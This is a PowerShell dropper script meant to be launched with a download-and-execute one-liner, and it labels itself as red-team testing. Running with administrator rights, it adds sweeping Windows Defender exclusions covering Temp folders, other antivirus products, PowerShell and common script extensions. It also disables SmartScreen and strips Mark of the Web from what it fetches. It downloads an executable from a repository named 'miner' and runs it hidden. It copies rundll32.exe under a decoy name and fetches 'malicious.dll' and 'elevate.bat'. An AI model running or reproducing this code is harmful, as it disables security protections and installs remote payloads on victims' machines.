# script.ps1 (Working script with malicious.dll download, rundll32.exe copy, and elevate.bat download in C:\Windows\Temp)
# Fetched via: cmd.exe /c powershell.exe -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex"
# Prioritizes updater.exe handling, then checks and downloads DLL, copies rundll32.exe, and downloads batch file for ethical red team testing.

Start-Sleep -Seconds 15

# Logging Setup
$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path -Path $logPath -Parent

if (-not (Test-Path -Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

# Initial log entry
try {
    Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account (02:30 PM IST, June 30, 2025)." -Force
} catch {
    Write-Host "Failed to create log at $logPath: $_"
    exit
}

# Check execution policy
try {
    $policy = Get-ExecutionPolicy -Scope CurrentUser
    Add-Content -Path $logPath -Value "Execution Policy: $policy"
    if ($policy -eq "Restricted") {
        Add-Content -Path $logPath -Value "WARNING: Execution policy is Restricted. Set to RemoteSigned."
        Write-Host "Execution policy is Restricted. Run 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned'."
    }
} catch {
    Add-Content -Path $logPath -Value "Failed to check execution policy: $_"
    Write-Host "Failed to check execution policy: $_"
}

# Verify admin status
function Is-Admin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    } catch {
        Add-Content -Path $logPath -Value "Failed to check admin status: $_"
        return $false
    }
}
try {
    if (Is-Admin) {
        Add-Content -Path $logPath -Value "Confirmed: Running with Administrator (SYSTEM) privileges."
    } else {
        Add-Content -Path $logPath -Value "WARNING: Not running with Administrator privileges."
        Write-Host "Not running with admin privileges. Some operations may fail."
    }
} catch {
    Add-Content -Path $logPath -Value "Error checking admin status: $_"
    Write-Host "Error checking admin status: $_"
}

# Updater.exe Handling
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\updater.exe"

try {
    Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."
    if (Test-Path -Path $payloadPath) {
        Add-Content -Path $logPath -Value "Existing updater.exe found at $payloadPath."
        
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
            Add-Content -Path $logPath -Value "Warning: Existing file does not have .exe extension."
        } else {
            Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
        }

        $existingSize = (Get-Item -Path $payloadPath).Length
        Add-Content -Path $logPath -Value "Existing file size: $existingSize bytes."

        try {
            Unblock-File -Path $payloadPath -ErrorAction Stop
            Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
        } catch {
            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath: $_"
            Write-Host "Failed to remove Mark of the Web from $payloadPath: $_"
        }

        try {
            Add-Content -Path $logPath -Value "Attempting to execute existing updater.exe..."
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
            Add-Content -Path $logPath -Value "Existing updater.exe executed successfully."
        } catch {
            Add-Content -Path $logPath -Value "Execution failed: $_"
            Write-Host "Failed to execute existing updater.exe: $_"
        }
    } else {
        Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation."

        # Defender Exclusions
        Add-Content -Path $logPath -Value "Waiting for Windows Defender service..."
        $maxAttempts = 20
        $delayBetweenChecks = 5

        for ($i = 0; $i -lt $maxAttempts; $i++) {
            try {
                $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
                $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
                if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
                    Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
                    break
                }
            } catch {
                Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not ready: $_"
            }
            Start-Sleep -Seconds $delayBetweenChecks
            if ($i -eq ($maxAttempts - 1)) {
                Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be ready."
            }
        }
        Add-Content -Path $logPath -Value "Finished Defender wait. Proceeding with exclusions."

        Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

        $exclusionsPaths = @(
            "C:\Users\Public\SystemLib",
            "C:\Windows\Temp\updater.exe",
            "C:\ProgramData\WinKit",
            "C:\Windows\Temp\*",
            "C:\ProgramData\Microsoft\Windows\Temp",
            "C:\Users\*\AppData\Local\Temp",
            "C:\Windows\System32\Tasks",
            "C:\Windows\SysWOW64\Tasks",
            "C:\Program Files\McAfee",
            "C:\Program Files\Symantec",
            "C:\Program Files\Kaspersky Lab",
            "C:\Program Files\Avast Software",
            "C:\Program Files\AVG",
            "C:\Windows\Temp\malicious.dll",
            "C:\Windows\Temp\legit.exe",
            "C:\Windows\Temp\elevate.bat"
        )

        $exclusionsProcesses = @(
            "updater.exe",
            "cmd.exe",
            "powershell.exe",
            "legit.exe"
        )

        $exclusionsExtensions = @(
            "exe",
            "bat",
            "cmd",
            "ps1",
            "vbs",
            "js",
            "dll"
        )

        foreach ($excl in $exclusionsPaths) {
            try {
                $currentExclusions = Get-MpPreference
                $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
                if (-not $pathExists) {
                    Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
                    Add-Content -Path $logPath -Value "Exclusion path added: $excl"
                } else {
                    Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
                }
            } catch {
                Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
            }
        }

        foreach ($excl in $exclusionsProcesses) {
            try {
                $currentExclusions = Get-MpPreference
                $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
                if (-not $processExists) {
                    Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
                    Add-Content -Path $logPath -Value "Exclusion process added: $excl"
                } else {
                    Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
                }
            } catch {
                Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
            }
        }

        foreach ($excl in $exclusionsExtensions) {
            try {
                $currentExclusions = Get-MpPreference
                $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
                if (-not $extensionExists) {
                    Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
                    Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
                } else {
                    Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
                }
            } catch {
                Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
            }
        }

        Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

        # SmartScreen and Payload Download
        Add-Content -Path $logPath -Value "Attempting to disable SmartScreen and fetch .exe payload from $payloadUrl without execution."

        try {
            $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
            try {
                Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
                Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
            } catch {
                Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
            }

            $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
            if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
                Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
            } else {
                Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
            }

            if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
                New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
                Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path -Path $payloadPath -Parent)."
            }

            Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
            $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
            Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"

            $downloadedSize = (Get-Item -Path $payloadPath).Length
            Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."

            if (-not (Test-Path -Path $payloadPath)) {
                throw "Downloaded file not found at $payloadPath."
            }
            if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
                Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
            }
            Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."

            try {
                Unblock-File -Path $payloadPath -ErrorAction Stop
                Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
            } catch {
                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath: $_"
            }

            Add-Content -Path $logPath -Value "Payload downloaded successfully but not executed, as per configuration."

        } catch {
            Add-Content -Path $logPath -Value "Failed to fetch payload from $payloadUrl: $_"
            Write-Host "Failed to fetch payload: $_"
        }
    }
} catch {
    Add-Content -Path $logPath -Value "Updater.exe handling failed: $_"
    Write-Host "Updater.exe handling failed: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."

# Download malicious.dll, Copy rundll32.exe, and Download elevate.bat
try {
    Add-Content -Path $logPath -Value "Starting malicious.dll download, rundll32.exe copy, and elevate.bat download."

    # Copy rundll32.exe to C:\Windows\Temp\legit.exe
    $legitExePath = "$env:windir\System32\rundll32.exe"
    $tempLegitExePath = "C:\Windows\Temp\legit.exe"
    if (-not (Test-Path -Path $tempLegitExePath)) {
        try {
            Copy-Item -Path $legitExePath -Destination $tempLegitExePath -Force -ErrorAction Stop
            Add-Content -Path $logPath -Value "Copied rundll32.exe to $tempLegitExePath."
        } catch {
            Add-Content -Path $logPath -Value "Failed to copy rundll32.exe to $tempLegitExePath: $_"
            Write-Host "Failed to copy rundll32.exe: $_"
        }
    } else {
        Add-Content -Path $logPath -Value "legit.exe already exists at $tempLegitExePath."
    }

    # Download malicious.dll
    $dllPath = "C:\Windows\Temp\malicious.dll"
    $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
    if (-not (Test-Path -Path $dllPath)) {
        try {
            Add-Content -Path $logPath -Value "Downloading malicious.dll from $dllUrl..."
            Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
            Add-Content -Path $logPath -Value "Downloaded malicious.dll to $dllPath."
            try {
                Unblock-File -Path $dllPath -ErrorAction Stop
                Add-Content -Path $logPath -Value "Removed Mark of the Web from $dllPath."
            } catch {
                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $dllPath: $_"
                Write-Host "Failed to remove Mark of the Web from $dllPath: $_"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to download malicious.dll from $dllUrl: $_"
            Write-Host "Failed to download malicious.dll: $_"
        }
    } else {
        Add-Content -Path $logPath -Value "malicious.dll already exists at $dllPath."
    }

    # Download elevate.bat
    $batPath = "C:\Windows\Temp\elevate.bat"
    $batUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/elevate.bat"
    if (-not (Test-Path -Path $batPath)) {
        try {
            Add-Content -Path $logPath -Value "Downloading elevate.bat from $batUrl..."
            Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing -ErrorAction Stop
            Add-Content -Path $logPath -Value "Downloaded elevate.bat to $batPath."
            try {
                Unblock-File -Path $batPath -ErrorAction Stop
                Add-Content -Path $logPath -Value "Removed Mark of the Web from $batPath."
            } catch {
                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $batPath: $_"
                Write-Host "Failed to remove Mark of the Web from $batPath: $_"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to download elevate.bat from $batUrl: $_"
            Write-Host "Failed to download elevate.bat: $_"
        }
    } else {
        Add-Content -Path $logPath -Value "elevate.bat already exists at $batPath."
    }
} catch {
    Add-Content -Path $logPath -Value "DLL download, rundll32.exe copy, or elevate.bat download failed: $_"
    Write-Host "DLL download, rundll32.exe copy, or elevate.bat download failed: $_"
}

Add-Content -Path $logPath -Value "Additional operations completed at $(Get-Date)."
